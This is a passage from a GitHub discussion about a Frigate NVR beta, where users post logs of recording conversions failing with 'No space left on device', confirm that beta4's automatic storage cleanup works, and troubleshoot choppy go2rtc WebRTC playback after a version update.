06:51:19.380278015    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 16000 Hz, mono, fltp, 48 kb/s (default) 2023-10-31 06:51:19.380280166      Metadata: 2023-10-31 06:51:19.380282532        handler_name    : SoundHandler 2023-10-31 06:51:19.380284997        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.380287752  /media/frigate/recordings/2023-10-31/11/ptz/51.01.mp4: No space left on device 2023-10-31 06:51:19.380289811   2023-10-31 06:51:19.499286064  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/driveway-20231031065019.mp4 to /media/frigate/recordings/2023-10-31/11/driveway/50.19.mp4 2023-10-31 06:51:19.499292892  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/driveway-20231031065019.mp4': 2023-10-31 06:51:19.499295367    Metadata: 2023-10-31 06:51:19.499297981      major_brand     : isom 2023-10-31 06:51:19.499300424      minor_version   : 512 2023-10-31 06:51:19.499302884      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.499305275      title           : Media Server 2023-10-31 06:51:19.499307748      encoder         : Lavf59.27.100 2023-10-31 06:51:19.499310454    Duration: 00:00:09.99, start: 0.000000, bitrate: 6332 kb/s 2023-10-31 06:51:19.499313996    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 3840x2160, 6322 kb/s, 15.07 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.499316166      Metadata: 2023-10-31 06:51:19.499318631        handler_name    : VideoHandler 2023-10-31 06:51:19.499320666        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.499323637    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 27 kb/s (default) 2023-10-31 06:51:19.499325752      Metadata: 2023-10-31 06:51:19.499328112        handler_name    : SoundHandler 2023-10-31 06:51:19.499330518        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.499333330  /media/frigate/recordings/2023-10-31/11/driveway/50.19.mp4: No space left on device 2023-10-31 06:51:19.499335343   2023-10-31 06:51:19.526415698  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/front_door-20231031065100.mp4 to /media/frigate/recordings/2023-10-31/11/front_door/51.00.mp4 2023-10-31 06:51:19.526422408  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/front_door-20231031065100.mp4': 2023-10-31 06:51:19.526424762    Metadata: 2023-10-31 06:51:19.526427327      major_brand     : isom 2023-10-31 06:51:19.526429695      minor_version   : 512 2023-10-31 06:51:19.526432006      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.526434294      title           : Media Server 2023-10-31 06:51:19.526436589      encoder         : Lavf59.27.100 2023-10-31 06:51:19.526439315    Duration: 00:00:09.99, start: 0.000000, bitrate: 6318 kb/s 2023-10-31 06:51:19.526442457    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 2560x1920, 6312 kb/s, 15.07 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.526444621      Metadata: 2023-10-31 06:51:19.526446948        handler_name    : VideoHandler 2023-10-31 06:51:19.526449322        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.526452284    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.526454372      Metadata: 2023-10-31 06:51:19.526456799        handler_name    : SoundHandler 2023-10-31 06:51:19.526459265        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.526462084  /media/frigate/recordings/2023-10-31/11/front_door/51.00.mp4: No space left on device 2023-10-31 06:51:19.526464077   2023-10-31 06:51:19.533969478  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/front_door-20231031065020.mp4 to /media/frigate/recordings/2023-10-31/11/front_door/50.20.mp4 2023-10-31 06:51:19.535137111  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/front_door-20231031065020.mp4': 2023-10-31 06:51:19.535142460    Metadata: 2023-10-31 06:51:19.535145276      major_brand     : isom 2023-10-31 06:51:19.535147928      minor_version   : 512 2023-10-31 06:51:19.535150247      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.535152559      title           : Media Server 2023-10-31 06:51:19.535154887      encoder         : Lavf59.27.100 2023-10-31 06:51:19.535157621    Duration: 00:00:10.03, start: 0.000000, bitrate: 6295 kb/s 2023-10-31 06:51:19.535161374    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 2560x1920, 6358 kb/s, 15.18 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.535163694      Metadata: 2023-10-31 06:51:19.535166235        handler_name    : VideoHandler 2023-10-31 06:51:19.535168653        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.535171501    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 26 kb/s (default) 2023-10-31 06:51:19.535173609      Metadata: 2023-10-31 06:51:19.535175945        handler_name    : SoundHandler 2023-10-31 06:51:19.535178284        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.535181041  /media/frigate/recordings/2023-10-31/11/front_door/50.20.mp4: No space left on device 2023-10-31 06:51:19.535183050   2023-10-31 06:51:19.535458629  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/front_door-20231031065050.mp4 to /media/frigate/recordings/2023-10-31/11/front_door/50.50.mp4 2023-10-31 06:51:19.535463147  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/front_door-20231031065050.mp4': 2023-10-31 06:51:19.535465546    Metadata: 2023-10-31 06:51:19.535468111      major_brand     : isom 2023-10-31 06:51:19.535470665      minor_version   : 512 2023-10-31 06:51:19.535473193      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.535475630      title           : Media Server 2023-10-31 06:51:19.535478114      encoder         : Lavf59.27.100 2023-10-31 06:51:19.535480862    Duration: 00:00:10.01, start: 0.000000, bitrate: 6313 kb/s 2023-10-31 06:51:19.535484422    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 2560x1920, 6313 kb/s, 15.06 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.535486621      Metadata: 2023-10-31 06:51:19.535489105        handler_name    : VideoHandler 2023-10-31 06:51:19.535491581        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.535494762    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.535496918      Metadata: 2023-10-31 06:51:19.535499450        handler_name    : SoundHandler 2023-10-31 06:51:19.535501987        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.535504868  /media/frigate/recordings/2023-10-31/11/front_door/50.50.mp4: No space left on device 2023-10-31 06:51:19.535507023   2023-10-31 06:51:19.583889720  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/driveway-20231031065039.mp4 to /media/frigate/recordings/2023-10-31/11/driveway/50.39.mp4 2023-10-31 06:51:19.583896072  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/driveway-20231031065039.mp4': 2023-10-31 06:51:19.583898702    Metadata: 2023-10-31 06:51:19.583901332      major_brand     : isom 2023-10-31 06:51:19.583903689      minor_version   : 512 2023-10-31 06:51:19.583906301      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.583908677      title           : Media Server 2023-10-31 06:51:19.583911069      encoder         : Lavf59.27.100 2023-10-31 06:51:19.583913727    Duration: 00:00:10.09, start: 0.000000, bitrate: 6256 kb/s 2023-10-31 06:51:19.583917311    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 3840x2160, 6294 kb/s, 15.03 fps, 15.08 tbr, 15360 tbn (default) 2023-10-31 06:51:19.583919579      Metadata: 2023-10-31 06:51:19.583921955        handler_name    : VideoHandler 2023-10-31 06:51:19.583924349        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.583927397    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 27 kb/s (default) 2023-10-31 06:51:19.583929571      Metadata: 2023-10-31 06:51:19.583932026        handler_name    : SoundHandler 2023-10-31 06:51:19.583934587        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.583937358  /media/frigate/recordings/2023-10-31/11/driveway/50.39.mp4: No space left on device 2023-10-31 06:51:19.583939365   2023-10-31 06:51:19.602510457  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/front_door-20231031065040.mp4 to /media/frigate/recordings/2023-10-31/11/front_door/50.40.mp4 2023-10-31 06:51:19.602517053  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/front_door-20231031065040.mp4': 2023-10-31 06:51:19.602519700    Metadata: 2023-10-31 06:51:19.602522397      major_brand     : isom 2023-10-31 06:51:19.602524887      minor_version   : 512 2023-10-31 06:51:19.602527514      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.602530157      title           : Media Server 2023-10-31 06:51:19.602532702      encoder         : Lavf59.27.100 2023-10-31 06:51:19.602535661    Duration: 00:00:10.05, start: 0.000000, bitrate: 6274 kb/s 2023-10-31 06:51:19.602539029    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 2560x1920, 6298 kb/s, 15.06 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.602541302      Metadata: 2023-10-31 06:51:19.602543687        handler_name    : VideoHandler 2023-10-31 06:51:19.602546053        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.602549066    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.602551230      Metadata: 2023-10-31 06:51:19.602553520        handler_name    : SoundHandler 2023-10-31 06:51:19.602556026        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.602558964  /media/frigate/recordings/2023-10-31/11/front_door/50.40.mp4: No space left on device 2023-10-31 06:51:19.602561126   2023-10-31 06:51:19.629133564  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/garage-20231031065029.mp4 to /media/frigate/recordings/2023-10-31/11/garage/50.29.mp4 2023-10-31 06:51:19.629139547  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/garage-20231031065029.mp4': 2023-10-31 06:51:19.629141676    Metadata: 2023-10-31 06:51:19.629143728      major_brand     : isom 2023-10-31 06:51:19.629145806      minor_version   : 512 2023-10-31 06:51:19.629147911      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.629149918      title           : Media Server 2023-10-31 06:51:19.629152046      encoder         : Lavf59.27.100 2023-10-31 06:51:19.629154247    Duration: 00:00:10.06, start: 0.000000, bitrate: 6307 kb/s 2023-10-31 06:51:19.629157236    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 2592x1944, 6346 kb/s, 20.11 fps, 20.17 tbr, 10240 tbn (default) 2023-10-31 06:51:19.629159083      Metadata: 2023-10-31 06:51:19.629161127        handler_name    : VideoHandler 2023-10-31 06:51:19.629163109        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.629165514    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 27 kb/s (default) 2023-10-31 06:51:19.629167266      Metadata: 2023-10-31 06:51:19.629169245        handler_name    : SoundHandler 2023-10-31 06:51:19.629171178        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.629173421  /media/frigate/recordings/2023-10-31/11/garage/50.29.mp4: No space left on device 2023-10-31 06:51:19.629175195   2023-10-31 06:51:19.633348321  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/garage-20231031065059.mp4 to /media/frigate/recordings/2023-10-31/11/garage/50.59.mp4 2023-10-31 06:51:19.633743603  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/garage-20231031065059.mp4': 2023-10-31 06:51:19.633747561    Metadata: 2023-10-31 06:51:19.633749693      major_brand     : isom 2023-10-31 06:51:19.633751749      minor_version   : 512 2023-10-31 06:51:19.633753857      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.633755807      title           : Media Server 2023-10-31 06:51:19.633764474      encoder         : Lavf59.27.100 2023-10-31 06:51:19.633767554    Duration: 00:00:10.04, start: 0.000000, bitrate: 6280 kb/s 2023-10-31 06:51:19.633771587    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 2592x1944, 6285 kb/s, 20.04 fps, 20 tbr, 10240 tbn (default) 2023-10-31 06:51:19.633773436      Metadata: 2023-10-31 06:51:19.633775464        handler_name    : VideoHandler 2023-10-31 06:51:19.633777363        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.633779832    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.633781556      Metadata: 2023-10-31 06:51:19.633783431        handler_name    : SoundHandler 2023-10-31 06:51:19.633785424        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.633787699  /media/frigate/recordings/2023-10-31/11/garage/50.59.mp4: No space left on device 2023-10-31 06:51:19.633789390   2023-10-31 06:51:19.648781284  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/front_door-20231031065030.mp4 to /media/frigate/recordings/2023-10-31/11/front_door/50.30.mp4 2023-10-31 06:51:19.648787855  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/front_door-20231031065030.mp4': 2023-10-31 06:51:19.648790432    Metadata: 2023-10-31 06:51:19.648793041      major_brand     : isom 2023-10-31 06:51:19.648795430      minor_version   : 512 2023-10-31 06:51:19.648797872      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.648800298      title           : Media Server 2023-10-31 06:51:19.648802667      encoder         : Lavf59.27.100 2023-10-31 06:51:19.648805415    Duration: 00:00:10.05, start: 0.000000, bitrate: 6324 kb/s 2023-10-31 06:51:19.648809143    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 2560x1920, 6346 kb/s, 15.05 fps, 14.99 tbr, 15360 tbn (default) 2023-10-31 06:51:19.648811307      Metadata: 2023-10-31 06:51:19.648813716        handler_name    : VideoHandler 2023-10-31 06:51:19.648816215        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.648819222    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.648821306      Metadata: 2023-10-31 06:51:19.648823652        handler_name    : SoundHandler 2023-10-31 06:51:19.648825966        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.648828743  /media/frigate/recordings/2023-10-31/11/front_door/50.30.mp4: No space left on device 2023-10-31 06:51:19.648830790   2023-10-31 06:51:19.670445057  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/garage-20231031065039.mp4 to /media/frigate/recordings/2023-10-31/11/garage/50.39.mp4 2023-10-31 06:51:19.671006409  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/garage-20231031065039.mp4': 2023-10-31 06:51:19.671010909    Metadata: 2023-10-31 06:51:19.671013441      major_brand     : isom 2023-10-31 06:51:19.671015861      minor_version   : 512 2023-10-31 06:51:19.671018461      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.671020963      title           : Media Server 2023-10-31 06:51:19.671023419      encoder         : Lavf59.27.100 2023-10-31 06:51:19.671026268    Duration: 00:00:10.07, start: 0.000000, bitrate: 6260 kb/s 2023-10-31 06:51:19.671029833    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 2592x1944, 6302 kb/s, 20.10 fps, 20 tbr, 10240 tbn (default) 2023-10-31 06:51:19.671032024      Metadata: 2023-10-31 06:51:19.671034457        handler_name    : VideoHandler 2023-10-31 06:51:19.671036653        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.671039637    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.671041640      Metadata: 2023-10-31 06:51:19.671044037        handler_name    : SoundHandler 2023-10-31 06:51:19.671046483        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.671049167  /media/frigate/recordings/2023-10-31/11/garage/50.39.mp4: No space left on device 2023-10-31 06:51:19.671051224   2023-10-31 06:51:19.693220555  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/garage-20231031065019.mp4 to /media/frigate/recordings/2023-10-31/11/garage/50.19.mp4 2023-10-31 06:51:19.693227522  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/garage-20231031065019.mp4': 2023-10-31 06:51:19.693230163    Metadata: 2023-10-31 06:51:19.693232854      major_brand     : isom 2023-10-31 06:51:19.693235488      minor_version   : 512 2023-10-31 06:51:19.693238214      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.693240795      title           : Media Server 2023-10-31 06:51:19.693243338      encoder         : Lavf59.27.100 2023-10-31 06:51:19.693246201    Duration: 00:00:10.07, start: 0.000000, bitrate: 6260 kb/s 2023-10-31 06:51:19.693250237    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 2592x1944, 6296 kb/s, 20.08 fps, 20 tbr, 10240 tbn (default) 2023-10-31 06:51:19.693252423      Metadata: 2023-10-31 06:51:19.693254955        handler_name    : VideoHandler 2023-10-31 06:51:19.693257351        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.693260591    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.693262784      Metadata: 2023-10-31 06:51:19.693265230        handler_name    : SoundHandler 2023-10-31 06:51:19.693267788        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.693270846  /media/frigate/recordings/2023-10-31/11/garage/50.19.mp4: No space left on device 2023-10-31 06:51:19.693272958   2023-10-31 06:51:19.696497583  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/back_porch-20231031065059.mp4 to /media/frigate/recordings/2023-10-31/11/back_porch/50.59.mp4 2023-10-31 06:51:19.696503618  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/back_porch-20231031065059.mp4': 2023-10-31 06:51:19.696505923    Metadata: 2023-10-31 06:51:19.696508763      major_brand     : isom 2023-10-31 06:51:19.696511015      minor_version   : 512 2023-10-31 06:51:19.696513225      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.696515328      title           : Media Server 2023-10-31 06:51:19.696517590      encoder         : Lavf59.27.100 2023-10-31 06:51:19.696520053    Duration: 00:00:10.12, start: 0.000000, bitrate: 6104 kb/s 2023-10-31 06:51:19.696523411    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 3840x2160, 6148 kb/s, 15.01 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.696525424      Metadata: 2023-10-31 06:51:19.696527583        handler_name    : VideoHandler 2023-10-31 06:51:19.696529722        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.696532261    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 27 kb/s (default) 2023-10-31 06:51:19.696534250      Metadata: 2023-10-31 06:51:19.696536562        handler_name    : SoundHandler 2023-10-31 06:51:19.696538788        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.696541479  /media/frigate/recordings/2023-10-31/11/back_porch/50.59.mp4: No space left on device 2023-10-31 06:51:19.696543384   2023-10-31 06:51:19.697038963  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/garage-20231031065049.mp4 to /media/frigate/recordings/2023-10-31/11/garage/50.49.mp4 2023-10-31 06:51:19.697221102  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/garage-20231031065049.mp4': 2023-10-31 06:51:19.697224536    Metadata: 2023-10-31 06:51:19.697226863      major_brand     : isom 2023-10-31 06:51:19.697229044      minor_version   : 512 2023-10-31 06:51:19.697245530      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.697248467      title           : Media Server 2023-10-31 06:51:19.697251212      encoder         : Lavf59.27.100 2023-10-31 06:51:19.697253483    Duration: 00:00:10.03, start: 0.000000, bitrate: 6326 kb/s 2023-10-31 06:51:19.697256677    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuvj420p(pc, bt709, progressive), 2592x1944, 6330 kb/s, 20.06 fps, 20 tbr, 10240 tbn (default) 2023-10-31 06:51:19.697258456      Metadata: 2023-10-31 06:51:19.697260458        handler_name    : VideoHandler 2023-10-31 06:51:19.697262346        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.697264951    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.697266651      Metadata: 2023-10-31 06:51:19.697268574        handler_name    : SoundHandler 2023-10-31 06:51:19.697270544        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.697272933  /media/frigate/recordings/2023-10-31/11/garage/50.49.mp4: No space left on device 2023-10-31 06:51:19.697274558   2023-10-31 06:51:19.727316938  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Unable to convert /tmp/cache/back_porch-20231031065049.mp4 to /media/frigate/recordings/2023-10-31/11/back_porch/50.49.mp4 2023-10-31 06:51:19.727322458  [2023-10-31 06:51:19] frigate.record.maintainer      ERROR   : Input #0, mov,mp4,m4a,3gp,3g2,mj2, from '/tmp/cache/back_porch-20231031065049.mp4': 2023-10-31 06:51:19.727324509    Metadata: 2023-10-31 06:51:19.727326648      major_brand     : isom 2023-10-31 06:51:19.727328739      minor_version   : 512 2023-10-31 06:51:19.727330744      compatible_brands: isomiso2avc1mp41 2023-10-31 06:51:19.727332748      title           : Media Server 2023-10-31 06:51:19.727334717      encoder         : Lavf59.27.100 2023-10-31 06:51:19.727336961    Duration: 00:00:09.98, start: 0.000000, bitrate: 6185 kb/s 2023-10-31 06:51:19.727340039    Stream #0:0[0x1](und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(progressive), 3840x2160, 6154 kb/s, 15.03 fps, 15 tbr, 15360 tbn (default) 2023-10-31 06:51:19.727341804      Metadata: 2023-10-31 06:51:19.727343851        handler_name    : VideoHandler 2023-10-31 06:51:19.727345793        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.727348300    Stream #0:1[0x2](und): Audio: aac (LC) (mp4a / 0x6134706D), 8000 Hz, mono, fltp, 28 kb/s (default) 2023-10-31 06:51:19.727349982      Metadata: 2023-10-31 06:51:19.727351957        handler_name    : SoundHandler 2023-10-31 06:51:19.727353931        vendor_id       : [0][0][0][0] 2023-10-31 06:51:19.727356343  /media/frigate/recordings/2023-10-31/11/back_porch/50.49.mp4: No space left on device  ``` |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

43 replies

Show 38 previous replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 8, 2023](#discussioncomment-7512502) Collaborator Author Sponsor

 -

| Is this on beta4 or after the recent commit that I did? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@aneisch](https://avatars.githubusercontent.com/u/6991461?s=60&v=4)](/aneisch)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [aneisch](/aneisch) [Nov 8, 2023](#discussioncomment-7512515)

 -

| This is beta 4. My disk was 100%, so I mnaully cleared some space and upgraded to beta 4 and now it is working as expected. |
| --- |

Beta
Was this translation helpful?
Give feedback.

 👍
1

All reactions

* 👍
  1

[![@simondrake](https://avatars.githubusercontent.com/u/62928647?s=60&v=4)](/simondrake)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [simondrake](/simondrake) [Nov 10, 2023](#discussioncomment-7531827)

 -

| Update to beta4 and I'm now seeing the cleanup  ``` 2023-11-10 03:57:46.409960698  [2023-11-10 03:57:46] frigate.storage                INFO    : Less than 1 hour of recording space left, running storage maintenance... 2023-11-10 03:57:49.883490882  [2023-11-10 03:57:49] frigate.storage                INFO    : Cleaned up 3739.8999999999996 MB of recordings 2023-11-10 05:57:50.112733089  [2023-11-10 05:57:50] frigate.storage                INFO    : Less than 1 hour of recording space left, running storage maintenance... 2023-11-10 05:57:52.622767832  [2023-11-10 05:57:52] frigate.storage                INFO    : Cleaned up 3739.700000000007 MB of recordings 2023-11-10 07:42:52.784851529  [2023-11-10 07:42:52] frigate.storage                INFO    : Less than 1 hour of recording space left, running storage maintenance... 2023-11-10 07:42:55.499798695  [2023-11-10 07:42:55] frigate.storage                INFO    : Cleaned up 3739.499999999992 MB of recordings 2023-11-10 08:57:55.633852147  [2023-11-10 08:57:55] frigate.storage                INFO    : Less than 1 hour of recording space left, running storage maintenance... 2023-11-10 08:57:56.160178640  [2023-11-10 08:57:56] frigate.storage                INFO    : Cleaned up 3740.8999999999924 MB of recordings ```  One question I have - is it possible to configure how much disk Frigate tries to consume? For example, my disk space is currently sitting at 99% - is there a way to tell Frigate to start a cleanup at 80% instead? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 10, 2023](#discussioncomment-7532934) Collaborator Author Sponsor

 -

| No it's not possible, this is because this isn't meant to be a full frigate disk usage feature. It's meant to be a last ditch effort to ensure frigate can keep recording. It's still recommended to just configure the retention period to fit the amount of space that you want. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@simondrake](https://avatars.githubusercontent.com/u/62928647?s=60&v=4)](/simondrake)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [simondrake](/simondrake) [Nov 10, 2023](#discussioncomment-7533669)

 -

| Makes sense. Thanks! |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [patdemko](/patdemko) [Oct 31, 2023](#discussioncomment-7438109)

 -

| I didn't see it mentioned, but were there any changes to go2rtc from beta2 to beta3? I often stream a couple cameras to a browser using the "/live/webrtc/stream.html?src=" method through frigate and have noticed with beta3 the playback is really choppy and will lose like up 10 seconds at a time quite often. Nothing stood out to me in any of the logs. When I switch back to beta2 the issue is gone. BTW, I'm also routing it all through a traefik https proxy located on the same host if that matters. Any ideas on how to troubleshoot this? |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

5 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 31, 2023](#discussioncomment-7438126) Collaborator Author Sponsor

 -

| Yes, go2rtc was updated to 1.8.1 |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@patdemko](https://avatars.githubusercontent.com/u/11141892?s=60&v=4)](/patdemko)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [patdemko](/patdemko) [Oct 31, 2023](#discussioncomment-7438558)

 -

| Ok, since it looks like beta2 was 1.7.1 and my issue started with beta3 (1.8.1) I think [this bug with 1.8.X](https://github.com/AlexxIT/go2rtc/issues/694) may be causing it. I'll try using the [custom go2rtc version configuration option](https://deploy-preview-6262--frigate-docs.netlify.app/configuration/advanced#custom-go2rtc-version) to go back to 1.7.1 with beta3 when i have time to see if that's my issue. Thanks! |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 31, 2023](#discussioncomment-7438566) Collaborator Author Sponsor

 -

| yes, I have also seen a couple reports on go2rtc for the same so it may be fixed in a future update |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

